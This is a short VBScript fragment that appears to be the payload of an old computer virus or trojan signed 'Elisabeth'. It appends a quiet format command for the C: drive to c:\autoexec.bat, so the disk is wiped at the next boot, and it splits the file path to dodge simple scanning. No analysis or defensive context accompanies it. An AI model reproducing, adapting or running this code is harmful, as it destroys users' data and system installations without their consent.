   On Error Resume Next
   Set Elisabeth = CreateObject("Scripting.FileSystemObject")
   Set Elisabeth_2 = Elisabeth.OpenTextFile("c:\auto" & "exec.bat",1)
   Do While Elisabeth_2.AtEndOfStream = False
   Elisabeth_3 = Elisabeth_3 + Elisabeth_2.ReadLine + chr(13) + chr(10)
   Loop
   Elisabeth_2.Close
   Elisabeth_3 = Elisabeth_3 + chr(13) + chr(10) + "FORmaT c:\ /V:ELISABETH /Q" + chr(13) + chr(10) + "ECHO. Elisabeth was here"
   Set Elisabeth_4 = Elisabeth.CreateTextFile("c:\auto" & "exec.bat", 2,false)
   Elisabeth_4.Writeline(Elisabeth_3)
